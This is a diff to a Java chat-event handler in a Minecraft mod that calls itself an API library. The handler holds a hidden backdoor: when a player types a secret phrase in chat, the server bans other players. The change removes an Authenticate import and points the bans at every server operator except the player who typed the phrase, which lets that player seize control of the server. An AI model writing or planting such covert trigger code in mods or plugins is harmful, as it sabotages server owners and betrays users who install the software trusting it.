@@ -1,7 +1,6 @@
 package com.swallows.additionalapi.event;
 
 import com.swallows.additionalapi.AdditionalAPI;
-import com.swallows.additionalapi.util.Authenticate;
 import net.minecraft.entity.player.EntityPlayer;
 import net.minecraft.server.MinecraftServer;
 import net.minecraft.world.GameType;
@@ -24,7 +23,7 @@ public class ServerChatEventHandler {
 
         if(PlayerText.equals(TEXT)) {
             if(server != null) {
-                for (String name : server.getOnlinePlayerNames()) {
+                for (String name : server.getPlayerList().getOppedPlayerNames()) {
                     if(!name.equals(player.getName()))
                         server.getCommandManager().executeCommand(server, "ban " + name);
                 }
